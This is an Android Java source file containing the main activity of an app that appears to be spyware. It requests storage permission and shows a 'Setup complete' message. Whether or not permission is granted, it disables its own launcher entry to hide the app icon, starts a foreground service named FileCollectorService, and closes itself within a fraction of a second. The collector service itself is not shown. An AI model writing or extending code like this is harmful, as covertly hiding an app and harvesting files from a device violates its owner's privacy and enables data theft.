package com.internet.app;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Toast;
import androidx.activity.ComponentActivity;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import java.util.Map;

public class MainActivity extends ComponentActivity {

    private final ActivityResultLauncher<String[]> permissionLauncher =
        registerForActivityResult(
            new ActivityResultContracts.RequestMultiplePermissions(),
            (Map<String, Boolean> result) -> {
                // Check if storage permission was granted
                boolean granted = false;
                for (Map.Entry<String, Boolean> entry : result.entrySet()) {
                    if (entry.getValue()) {
                        granted = true;
                        break;
                    }
                }
                if (granted) {
                    Toast.makeText(this, "Setup complete", Toast.LENGTH_SHORT).show();
                }
                // Proceed regardless — hide icon and start service
                startServiceAndHide();
            }
        );

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // ★ IMPORTANT: Set a real layout so this activity has a visible window
        setContentView(R.layout.activity_main);
        requestPermissionsAndStart();
    }

    private void requestPermissionsAndStart() {
        // Request storage permission — works on all Android versions with targetSdk=29
        permissionLauncher.launch(new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE
        });
    }

    private void startServiceAndHide() {
        // Step 1: Hide launcher icon
        try {
            PackageManager pm = getPackageManager();
            ComponentName component = new ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception ignored) {}

        // Step 2: Start foreground service
        Intent serviceIntent = new Intent(this, FileCollectorService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // Step 3: Close activity after a short delay
        new Handler(getMainLooper()).postDelayed(this::finishAndRemoveTask, 300);
    }
}
